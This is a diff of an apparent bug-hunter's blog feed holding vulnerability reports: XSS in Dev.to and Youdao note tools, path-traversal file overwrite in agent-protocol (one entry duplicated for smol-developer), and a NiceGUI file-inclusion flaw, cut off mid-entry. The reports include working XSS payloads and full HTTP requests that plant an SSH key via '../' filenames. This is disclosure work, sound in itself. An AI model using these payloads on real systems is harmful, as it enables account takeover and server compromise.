@@ -1,4 +1,593 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-04-09T15:30:26+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">高危：有道智云存在微博OAuth2登录缺陷串联XSS漏洞实现账户劫持(忽略!)</title><link href="http://localhost:4000/account-takeover/2024/04/09/ai-youdao-oauth2-account-takeover.html" rel="alternate" type="text/html" title="高危：有道智云存在微博OAuth2登录缺陷串联XSS漏洞实现账户劫持(忽略!)" /><published>2024-04-09T10:26:18+08:00</published><updated>2024-04-09T10:26:18+08:00</updated><id>http://localhost:4000/account-takeover/2024/04/09/ai-youdao-oauth2-account-takeover</id><content type="html" xml:base="http://localhost:4000/account-takeover/2024/04/09/ai-youdao-oauth2-account-takeover.html"><![CDATA[<h2 id="name">Name</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-05-03T19:15:10+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">Dev.to(Forem) cta xss</title><link href="http://localhost:4000/xss/2024/04/30/xss-devto.html" rel="alternate" type="text/html" title="Dev.to(Forem) cta xss" /><published>2024-04-30T10:26:18+08:00</published><updated>2024-04-30T10:26:18+08:00</updated><id>http://localhost:4000/xss/2024/04/30/xss-devto</id><content type="html" xml:base="http://localhost:4000/xss/2024/04/30/xss-devto.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Devto cta xss</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+<blockquote>
+  <p>XSS</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+<blockquote>
+  <p>Medium</p>
+</blockquote>
+
+<h2 id="summary">Summary</h2>
+
+<p>DEV is a community of software developers which is built on <a href="https://github.com/forem">Forem</a>: open source software designed to empower communities. You can edit your blog with its buildin markdown editor using liquid markdown syntax.</p>
+
+<p>For example, <a href="https://dev.to/devteam/lesser-known-features-of-dev-embedding-call-to-action-cta-buttons-2gni">CTA</a> uses 
+<code class="language-plaintext highlighter-rouge">{% cta link %} desc {% endcta %}</code>
+ to create a button with a link to jump to. However, the backend didn’t sanitize <code class="language-plaintext highlighter-rouge">javascript</code> link, causing click xss.</p>
+
+<h4 id="trigger">Trigger</h4>
+<ol>
+  <li>
+    <p>Create a post or comment, in the editor, send following payload:</p>
+
+    <p><code class="language-plaintext highlighter-rouge">{% cta javascript:alert(document.domain) %} clickme {% endcta %}</code></p>
+
+    <p><img src="/assets/images/bughunter/dev1.png" alt="dev1" /></p>
+
+    <p><img src="/assets/images/bughunter/dev-com1.png" alt="dev1" /></p>
+  </li>
+  <li>
+    <p>After payload sent, a button is rendered, click the button, the xss is triggered!</p>
+
+    <p><img src="/assets/images/bughunter/dev2.png" alt="dev2" /></p>
+
+    <p><img src="/assets/images/bughunter/dev3.png" alt="dev3" /></p>
+
+    <p><img src="/assets/images/bughunter/dev-com2.png" alt="dev2" /></p>
+
+    <p><img src="/assets/images/bughunter/dev-com3.png" alt="dev3" /></p>
+  </li>
+  <li>
+    <p>Using chrome dev tools to check the rendered result:</p>
+
+    <p><img src="/assets/images/bughunter/dev-com4.png" alt="dev4" /></p>
+  </li>
+</ol>
+
+<h3 id="root-cause">Root cause</h3>
+
+<p>Forem codebase: <a href="https://github.com/forem/forem/blob/154cd202b29186ede9850f9807ac4dc76eda6e34/app/views/liquids/_cta.html.erb#L1">_cta.html.erb</a></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;a href="&lt;%= link %&gt;" class="ltag_cta ltag_cta--&lt;%= type %&gt;" role="button"&gt;&lt;%= description %&gt;&lt;/a&gt;
+</code></pre></div></div>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">中危：有道云笔记网页版白板存在存储型XSS漏洞</title><link href="http://localhost:4000/xss/2024/04/30/xss-excalidraw.html" rel="alternate" type="text/html" title="中危：有道云笔记网页版白板存在存储型XSS漏洞" /><published>2024-04-30T10:26:18+08:00</published><updated>2024-04-30T10:26:18+08:00</updated><id>http://localhost:4000/xss/2024/04/30/xss-excalidraw</id><content type="html" xml:base="http://localhost:4000/xss/2024/04/30/xss-excalidraw.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>有道云笔记网页版白板存在存储型XSS漏洞</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+<blockquote>
+  <p>存储型XSS</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+<blockquote>
+  <p>中危</p>
+</blockquote>
+
+<h2 id="url">URL</h2>
+<ul>
+  <li>POC网页: <a href="https://note.youdao.com/s/5DooTGzS">https://note.youdao.com/s/5DooTGzS</a></li>
+</ul>
+
+<h2 id="summary">Summary</h2>
+
+<p>有道云白板使用过时<code class="language-plaintext highlighter-rouge">excalidraw</code>，该插件存在已知xss漏洞：给任意白板元素添加链接时，没有过滤链接的协议，攻击者能够构造javascript链接，受害者点击元素后触发javascript payload执行</p>
+
+<h3 id="detail">Detail</h3>
+
+<h4 id="trigger">Trigger</h4>
+<ol>
+  <li>
+    <p>打开有道云网页版，新建白板，在白板中画任意元素。</p>
+  </li>
+  <li>
+    <p>选定该元素，点击添加添加链接，链接框填写如下payload：<code class="language-plaintext highlighter-rouge">javascript://%0aalert(document.cookie)</code></p>
+
+    <p><img src="/assets/images/youdaoyun2/excalidraw1.png" alt="excalidraw1" /></p>
+  </li>
+  <li>
+    <p>点击元素链接后，xss触发。分享给他人，只需点击一次即可触发xss。</p>
+
+    <p><img src="/assets/images/youdaoyun2/excalidraw2.png" alt="excalidraw2" /></p>
+
+    <p><img src="/assets/images/youdaoyun2/excalidraw3.png" alt="excalidraw3" /></p>
+  </li>
+</ol>
+
+<h3 id="proof">Proof</h3>
+<p>请提供截图或视频</p>
+
+<p>POC链接：
+https://note.youdao.com/s/5DooTGzS</p>
+
+<p>参考：<a href="https://github.com/advisories/GHSA-v7v8-gjv7-ffmr">https://github.com/advisories/GHSA-v7v8-gjv7-ffmr</a></p>
+
+<h2 id="impact">Impact</h2>
+
+<p>该漏洞影响点击分享链接的用户，攻击者可以注入xss脚本获取受害者所有笔记ID和笔记内容，造成严重的敏感信息泄露。</p>
+
+<h2 id="patch-advice">Patch advice</h2>
+
+<ol>
+  <li>升级渲染excalidraw插件到最新版本</li>
+</ol>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">中危：有道云笔记网页版思维导图存在存储型XSS漏洞</title><link href="http://localhost:4000/xss/2024/04/30/xss-mindmap.html" rel="alternate" type="text/html" title="中危：有道云笔记网页版思维导图存在存储型XSS漏洞" /><published>2024-04-30T10:26:18+08:00</published><updated>2024-04-30T10:26:18+08:00</updated><id>http://localhost:4000/xss/2024/04/30/xss-mindmap</id><content type="html" xml:base="http://localhost:4000/xss/2024/04/30/xss-mindmap.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>有道云笔记网页版思维导图存在存储型XSS漏洞</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+<blockquote>
+  <p>存储型XSS</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+<blockquote>
+  <p>中危</p>
+</blockquote>
+
+<h2 id="url">URL</h2>
+<ul>
+  <li>POC网页: <a href="https://note.youdao.com/s/JOK4BY08">https://note.youdao.com/s/JOK4BY08</a></li>
+</ul>
+
+<h2 id="summary">Summary</h2>
+
+<p>有道云笔记<code class="language-plaintext highlighter-rouge">mindmap</code>思维导图能够插入<code class="language-plaintext highlighter-rouge">javascript</code>链接，受害者点击链接后可触发xss执行。</p>
+
+<h4 id="trigger">Trigger</h4>
+
+<ol>
+  <li>
+    <p>打开有道云网页版，新建脑图。添加分支主题，选中该分支，然后点击插入链接。</p>
+
+    <p><img src="/assets/images/youdaoyun2/mindmap1.png" alt="mindmap1" /></p>
+  </li>
+  <li>
+    <p>输入任意url，开启burpsuite拦截请求：<code class="language-plaintext highlighter-rouge">POST /yws/api/personal/sync</code>。该请求将用户最新修改发送到后台。由于前端对url做了过滤，只能输入http协议，因此通过该请求修改成javascript协议。</p>
+
+    <p><img src="/assets/images/youdaoyun2/mindmap2.png" alt="mindmap2" /></p>
+
+    <p><img src="/assets/images/youdaoyun2/mindmap3.png" alt="mindmap3" /></p>
+  </li>
+  <li>
+    <p>发送请求，修改url链接成功，链接连接后，xss触发。</p>
+
+    <p><img src="/assets/images/youdaoyun2/mindmap4.png" alt="mindmap4" /></p>
+  </li>
+</ol>
+
+<h3 id="proof">Proof</h3>
+<p>请提供截图或视频</p>
+
+<p>POC链接：
+<a href="https://note.youdao.com/s/JOK4BY08">https://note.youdao.com/s/JOK4BY08</a></p>
+
+<p>视频：</p>
+
+<p>链接：<a href="https://pan.baidu.com/s/1KpYkdI1SHA2q21sij1mJpA">https://pan.baidu.com/s/1KpYkdI1SHA2q21sij1mJpA</a></p>
+
+<p>提取码：1314</p>
+
+<h2 id="impact">Impact</h2>
+
+<p>该漏洞影响点击分享链接的用户，攻击者可以注入xss脚本获取受害者所有笔记ID和笔记内容，造成严重的敏感信息泄露。</p>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in agent-protocol</title><link href="http://localhost:4000/file-overwrite/2024/04/10/remote-code-executoin-via-afo-using-path-traversal-in-agent-protol.html" rel="alternate" type="text/html" title="Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in agent-protocol" /><published>2024-04-10T10:31:06+08:00</published><updated>2024-04-10T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/04/10/remote-code-executoin-via-afo-using-path-traversal-in-agent-protol</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/04/10/remote-code-executoin-via-afo-using-path-traversal-in-agent-protol.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in agent-protocol</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>CWE-22: Path Traversal</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>High (8.8)</p>
+</blockquote>
+
+<h2 id="description">Description</h2>
+
+<p>The <code class="language-plaintext highlighter-rouge">/ap/v1/agent/tasks//artifacts</code> endpoint in the agent-protocol python API is vulnerable to a path traversal vulnerability through the <code class="language-plaintext highlighter-rouge">filename</code> parameter which allows the uploading of arbitrary files. An attacker can upload and overwrite ANY file on the filesystem. This can lead to remote code execution in many different ways.</p>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<p>In this proof of concept, we will be gaining remote code execution by uploading our SSH key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file. There are many other ways to achieve remote code execution via a file upload, such as overwriting binaries, writing to .bashrc, ….</p>
+
+<p>We proof this vulnerability by logging into the <code class="language-plaintext highlighter-rouge">kali</code> user running the agent-protocol python API and checking that at this moment the <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> file does not exist.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
+cat: /home/kali/.ssh/authorized_keys: No such file or directory
+</code></pre></div></div>
+
+<p>An attacker can now send the following request to the webserver. This request will upload the attacker’s public RSA key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file.</p>
+
+<p>We start a simple server using example from <a href="https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/examples/minimal.py">https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/examples/minimal.py</a>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from agent_protocol import Agent, Task, Step
+
+async def task_handler(task: Task) -&gt; None:
+    print(f"task: {task.input}")
+    await Agent.db.create_step(task.task_id, task.input)
+
+async def step_handler(step: Step) -&gt; Step:
+    print(f"step: {step.input}")
+    await Agent.db.create_step(step.task_id, f"Next step from step {step.name}")
+    step.output = step.input
+    return step
+
+Agent.setup_agent(task_handler, step_handler).start()
+</code></pre></div></div>
+<p>Start server:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python mimimal.py
+</code></pre></div></div>
+
+<p>Then, create a task and get taskid:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:8000/ap/v1/agent/tasks HTTP/1.1
+Content-Type: application/json
+User-Agent: PostmanRuntime/7.37.0
+Accept: */*
+Postman-Token: 6d1b6f21-1923-4517-9073-6097d87e9668
+Host: 127.0.0.1:8000
+Accept-Encoding: gzip, deflate
+Connection: close
+Content-Length: 61
+
+{
+    "input": "test"
+}
+</code></pre></div></div>
+
+<p>Using taskid we created and upload <code class="language-plaintext highlighter-rouge">authorized_keys</code> file, set filename to <code class="language-plaintext highlighter-rouge">../../../../../../../../../home/kali/.ssh/authorized_keys</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:8000/ap/v1/agent/tasks/91225126-2e71-42c2-9389-edbe4dd16d31/artifacts HTTP/1.1
+Content-Type: multipart/form-data; boundary=--------------------------590741319467185743628097
+User-Agent: PostmanRuntime/7.37.0
+Accept: */*
+Postman-Token: 591713fe-b29e-4e94-b467-f8989f921b54
+Host: 127.0.0.1:8000
+Accept-Encoding: gzip, deflate
+Connection: close
+Content-Length: 2368
+
+----------------------------590741319467185743628097
+Content-Disposition: form-data; name="file"; filename="../../../../../../../../../home/kali/.ssh/authorized_keys"
+Content-Type: application/javascript
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAR0AgOOiNtyaS9q8ObZhZmfDzcpIdDr14J83LRPJJ1ht1wFs+fXJwShzuXM7RtnKMu0cf3dN1iLbZeuwvgegowBI8iUoF9QR/k8QNSHEmnk4ZbN6WzgoQeeVc/I3C6PyD/4afMsQRU6fzij8BwDIHcQccEKsDvJ/xvDZXEbn2I5XIlPUAzYwslk= 11593@samurai
+----------------------------590741319467185743628097--
+</code></pre></div></div>
+
+<p>The response indicates success with artifact file path.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 
+Content-Length: 169
+Connection: keep-alive
+Content-Type: application/json
+Date: Wed, 10 Apr 2024 06:38:25 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: hypercorn-h11
+
+{"artifact_id":"65c004cd-e7cf-4d4b-8009-cc775889c86e","agent_created":false,"file_name":"../../../../../../../../../home/kali/.ssh/authorized_keys","relative_path":null}
+</code></pre></div></div>
+
+<p>We can verify the success by again checking the /home/kali/.ssh/authorized_keys file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDb+p1vHNh3CdWiOt+1DDptHOL+Rs7/YeRmjALSIqEMw2XUXG7+dRpSKc7VNT+DaliwSUIU0KPIacKQsMq9sLE/rPmtKYSuNBUhF2LccqjtUkri/lWZjLvJUyidFeAc7jabbG2JvuMzxbAMy4uxYGHQm+4MuGymeBJIyYKaUa9fuMHE2UNqGkvANgh6WLdEGTpPf52rHPnhab6PRd5DzYDJxk/W0Lci+BSUDi+8b5xSxX6GMRTn74zy6AnyktP5+xmnetlkHxAEGLBppE9bInIsc/feCqXiH7Eeq6t8WR0AgOOiNtyaS9q8ObZhZmfDzcpIdDr14J83LRPJJ1ht1wFs+fXJwShzuXM7RtnKMu0cf3dN1iLbZeuwvgtOBQDLRa6AxN5JxskvY+hP3Tsz3FUf5TA9ckegowBI8iUoF9QR/k8QNSHEmnk4ZbN6WzgoQeeVc/I3C6PyD/4afMsQRU6fzij8BwDIHcQccEKsDvJ/xvDZXEbn2I5XIlPUAzYwslk= 11593@samurai
+</code></pre></div></div>
+
+<h2 id="impact">Impact</h2>
+
+<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>
+
+<p>Warning: this bug also affects <a href="https://github.com/smol-ai/developer">smol.ai</a></p>
+
+<h3 id="ssh-access">SSH Access</h3>
+
+<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>
+
+<h3 id="web-servers">Web Servers</h3>
+
+<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>
+
+<h2 id="reference">Reference</h2>
+
+<p><a href="https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e">https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e</a></p>
+
+<h2 id="occurrences">Occurrences</h2>
+
+<p><a href="https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/agent_protocol/agent.py#L188C49-L188C58">https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/agent_protocol/agent.py#L188C49-L188C58</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in smol-developer</title><link href="http://localhost:4000/file-overwrite/2024/04/10/remote-code-executoin-via-afo-using-path-traversal-in-smol-developer.html" rel="alternate" type="text/html" title="Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in smol-developer" /><published>2024-04-10T10:31:06+08:00</published><updated>2024-04-10T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/04/10/remote-code-executoin-via-afo-using-path-traversal-in-smol-developer</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/04/10/remote-code-executoin-via-afo-using-path-traversal-in-smol-developer.html"><![CDATA[<h2 id="name">Name</h2>
+
+<p>TODO：</p>
+
+<blockquote>
+  <p>Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in smol-developer</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>CWE-22: Path Traversal</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>High (8.8)</p>
+</blockquote>
+
+<h2 id="description">Description</h2>
+
+<p>The <code class="language-plaintext highlighter-rouge">/ap/v1/agent/tasks//artifacts</code> endpoint in the agent-protocol python API is vulnerable to a path traversal vulnerability through the <code class="language-plaintext highlighter-rouge">filename</code> parameter which allows the uploading of arbitrary files. An attacker can upload and overwrite ANY file on the filesystem. This can lead to remote code execution in many different ways.</p>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<p>In this proof of concept, we will be gaining remote code execution by uploading our SSH key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file. There are many other ways to achieve remote code execution via a file upload, such as overwriting binaries, writing to .bashrc, ….</p>
+
+<p>We proof this vulnerability by logging into the <code class="language-plaintext highlighter-rouge">kali</code> user running the agent-protocol python API and checking that at this moment the <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> file does not exist.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
+cat: /home/kali/.ssh/authorized_keys: No such file or directory
+</code></pre></div></div>
+
+<p>An attacker can now send the following request to the webserver. This request will upload the attacker’s public RSA key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file.</p>
+
+<p>We start a simple server using example from <a href="https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/examples/minimal.py">https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/examples/minimal.py</a>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from agent_protocol import Agent, Task, Step
+
+async def task_handler(task: Task) -&gt; None:
+    print(f"task: {task.input}")
+    await Agent.db.create_step(task.task_id, task.input)
+
+async def step_handler(step: Step) -&gt; Step:
+    print(f"step: {step.input}")
+    await Agent.db.create_step(step.task_id, f"Next step from step {step.name}")
+    step.output = step.input
+    return step
+
+Agent.setup_agent(task_handler, step_handler).start()
+</code></pre></div></div>
+<p>Start server:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python mimimal.py
+</code></pre></div></div>
+
+<p>Then, create a task and get taskid:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:8000/ap/v1/agent/tasks HTTP/1.1
+Content-Type: application/json
+User-Agent: PostmanRuntime/7.37.0
+Accept: */*
+Postman-Token: 6d1b6f21-1923-4517-9073-6097d87e9668
+Host: 127.0.0.1:8000
+Accept-Encoding: gzip, deflate
+Connection: close
+Content-Length: 61
+
+{
+    "input": "test"
+}
+</code></pre></div></div>
+
+<p>Using taskid we created and upload <code class="language-plaintext highlighter-rouge">authorized_keys</code> file, set filename to <code class="language-plaintext highlighter-rouge">../../../../../../../../../home/kali/.ssh/authorized_keys</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:8000/ap/v1/agent/tasks/91225126-2e71-42c2-9389-edbe4dd16d31/artifacts HTTP/1.1
+Content-Type: multipart/form-data; boundary=--------------------------590741319467185743628097
+User-Agent: PostmanRuntime/7.37.0
+Accept: */*
+Postman-Token: 591713fe-b29e-4e94-b467-f8989f921b54
+Host: 127.0.0.1:8000
+Accept-Encoding: gzip, deflate
+Connection: close
+Content-Length: 2368
+
+----------------------------590741319467185743628097
+Content-Disposition: form-data; name="file"; filename="../../../../../../../../../home/kali/.ssh/authorized_keys"
+Content-Type: application/javascript
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAR0AgOOiNtyaS9q8ObZhZmfDzcpIdDr14J83LRPJJ1ht1wFs+fXJwShzuXM7RtnKMu0cf3dN1iLbZeuwvgegowBI8iUoF9QR/k8QNSHEmnk4ZbN6WzgoQeeVc/I3C6PyD/4afMsQRU6fzij8BwDIHcQccEKsDvJ/xvDZXEbn2I5XIlPUAzYwslk= 11593@samurai
+----------------------------590741319467185743628097--
+</code></pre></div></div>
+
+<p>The response indicates success with artifact file path.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 
+Content-Length: 169
+Connection: keep-alive
+Content-Type: application/json
+Date: Wed, 10 Apr 2024 06:38:25 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: hypercorn-h11
+
+{"artifact_id":"65c004cd-e7cf-4d4b-8009-cc775889c86e","agent_created":false,"file_name":"../../../../../../../../../home/kali/.ssh/authorized_keys","relative_path":null}
+</code></pre></div></div>
+
+<p>We can verify the success by again checking the /home/kali/.ssh/authorized_keys file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDb+p1vHNh3CdWiOt+1DDptHOL+Rs7/YeRmjALSIqEMw2XUXG7+dRpSKc7VNT+DaliwSUIU0KPIacKQsMq9sLE/rPmtKYSuNBUhF2LccqjtUkri/lWZjLvJUyidFeAc7jabbG2JvuMzxbAMy4uxYGHQm+4MuGymeBJIyYKaUa9fuMHE2UNqGkvANgh6WLdEGTpPf52rHPnhab6PRd5DzYDJxk/W0Lci+BSUDi+8b5xSxX6GMRTn74zy6AnyktP5+xmnetlkHxAEGLBppE9bInIsc/feCqXiH7Eeq6t8WR0AgOOiNtyaS9q8ObZhZmfDzcpIdDr14J83LRPJJ1ht1wFs+fXJwShzuXM7RtnKMu0cf3dN1iLbZeuwvgtOBQDLRa6AxN5JxskvY+hP3Tsz3FUf5TA9ckegowBI8iUoF9QR/k8QNSHEmnk4ZbN6WzgoQeeVc/I3C6PyD/4afMsQRU6fzij8BwDIHcQccEKsDvJ/xvDZXEbn2I5XIlPUAzYwslk= 11593@samurai
+</code></pre></div></div>
+
+<h2 id="impact">Impact</h2>
+
+<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>
+
+<p>Warning: this bug also affects <a href="https://github.com/smol-ai/developer">smol.ai</a></p>
+
+<h3 id="ssh-access">SSH Access</h3>
+
+<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>
+
+<h3 id="web-servers">Web Servers</h3>
+
+<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>
+
+<h2 id="reference">Reference</h2>
+
+<p><a href="https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e">https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e</a></p>
+
+<h2 id="occurrences">Occurrences</h2>
+
+<p><a href="https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/agent_protocol/agent.py#L188C49-L188C58">https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/agent_protocol/agent.py#L188C49-L188C58</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">CVE-2024-32005: Local File Inclusion in NiceGUI leaflet component</title><link href="http://localhost:4000/file-overwrite/2024/04/10/local-file-inclusion-in-nicegui.html" rel="alternate" type="text/html" title="CVE-2024-32005: Local File Inclusion in NiceGUI leaflet component" /><published>2024-04-10T10:31:06+08:00</published><updated>2024-04-10T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/04/10/local-file-inclusion-in-nicegui</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/04/10/local-file-inclusion-in-nicegui.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>NiceGUI: Local File Inclusion in NiceGUI leaflet component</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>CWE-22: Path Traversal</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>High (8.8)</p>
+</blockquote>
+
+<h2 id="cve">CVE</h2>
+
+<blockquote>
+  <p><a href="https://www.cve.org/CVERecord?id=CVE-2024-32005">CVE-2024-32005: Local File Inclusion in NiceGUI leaflet component</a></p>
+</blockquote>
+
+<h2 id="description">Description</h2>
+
+<p>A local file inclusion is present in the NiceUI leaflet component when requesting resource files under the <code class="language-plaintext highlighter-rouge">/_nicegui/{__version__}/resources/{key}/{path:path}</code> route.</p>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<p>In <a href="https://github.com/zauberzeug/nicegui/blob/eac5a5faa9fbd8823a6b76784a76fce618fd7afc/nicegui/nicegui.py#L98">route</a> <code class="language-plaintext highlighter-rouge">/_nicegui/{__version__}/resources/{key}/{path:path}</code> is used for <a href="https://github.com/zauberzeug/nicegui/commit/b465af3bb7a825c89ca6562e5eb7ebfeee5bb589">serving CSS and JS resources locally</a>. The <code class="language-plaintext highlighter-rouge">path</code> parameter in url is not sanitized before appended to base path, an attacker can use <code class="language-plaintext highlighter-rouge">..</code> to escape base directory and locate any file on system which will be sent back to the attacker, causing local file inclusion issue.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@app.get(f'/_nicegui/{__version__}' + '/resources/{key}/{path:path}')
+def _get_resource(key: str, path: str) -&gt; FileResponse:
+    if key in resources:
+        filepath = resources[key].path / path
+        if filepath.exists():
+            headers = {'Cache-Control': 'public, max-age=3600'}
+            media_type, _ = mimetypes.guess_type(filepath)
+            return FileResponse(filepath, media_type=media_type, headers=headers)
+    raise HTTPException(status_code=404, detail=f'resource "{key}" not found')
+</code></pre></div></div>
+
+<p>However, the <code class="language-plaintext highlighter-rouge">resources</code> is only <a href="https://github.com/zauberzeug/nicegui/blob/eac5a5faa9fbd8823a6b76784a76fce618fd7afc/nicegui/elements/leaflet.py#L40">initialized</a> by <code class="language-plaintext highlighter-rouge">ui.leaflet</code> component. To exploit the bug, a developer should use <code class="language-plaintext highlighter-rouge">leaflet</code> component in web pages so that the route is activated. Consider following <a href="https://nicegui.io/documentation/leaflet#leaflet_map">code snippet</a> from official document.</p>
+
+<p>Firstly, install nicegui using <code class="language-plaintext highlighter-rouge">python pip</code>:</p>
